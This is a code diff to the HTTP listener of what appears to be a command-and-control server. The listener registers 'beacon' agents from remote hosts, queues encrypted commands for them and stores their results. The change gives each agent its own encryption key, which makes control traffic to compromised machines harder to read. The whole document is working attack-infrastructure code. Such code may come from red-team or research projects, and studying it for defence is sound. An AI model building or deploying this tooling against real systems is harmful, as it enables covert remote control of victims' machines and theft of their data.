@@ -41,11 +41,16 @@ class HTTP_listener:
         def register():
             beacon_name = ''.join(choice(ascii_letters) for i in range(10))
             beacon_ip = request.remote_addr
-            beacon_hostname = request.form.get('name')
-            beacon_type = request.form.get('type')
 
+            beacon_hostname = request.form.get('name')
+            beacon_hostname = DECRYPT(beacon_hostname, self.key)
+            beacon_type = request.form.get('type')
+            beacon_type = DECRYPT(beacon_type, self.key)
+            
             # success(f'New undercover agent {beacon_name}.')
-            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key, True)
+            agent_key = key_init()
+            # fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key, True)
+            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, agent_key, True)
             self.stash.sql_stash( '''INSERT INTO agents( agent_name, \
                                                          listener_name, \
                                                          remote_ip, \
@@ -53,15 +58,18 @@ class HTTP_listener:
                                                          beacon_type, \
                                                          enc_key, \
                                                          alive ) VALUES( ?, ?, ?, ?, ?, ?, ? )''', fields )
-            return (beacon_name, 200)
+
+            send_it = ENCRYPT(f'VALID {beacon_name} {agent_key}', self.key)
+            return (send_it, 200)
 
         @self.app.route('/tasks/<name>', methods=['GET'])
         def getinTask(name):
             task = self.stash.get_task(name)
             if task:
+                key = self.stash.get_agent_key(agent=name)
                 com_code = task[0][0]
                 enc_comm = task[0][1]
-                send_it = ENCRYPT(f'VALID {com_code} {enc_comm}', self.key)
+                send_it = ENCRYPT(f'VALID {com_code} {enc_comm}', key)
                 self.stash.del_commands(com_code)
                 return (send_it, 200)
             else:
@@ -73,7 +81,8 @@ class HTTP_listener:
             if self.stash.check_code(code):
                 enc_result = request.form.get('result')
                 if enc_result:
-                    result = DECRYPT(enc_result, self.key)
+                    key = self.stash.get_agent_key(task=code)
+                    result = DECRYPT(enc_result, key)
                 else:
                     result = 'NA'
                 self.stash.sql_stash( 'UPDATE commands_history SET output = ? WHERE command_code = ? ; ', (result, code) )
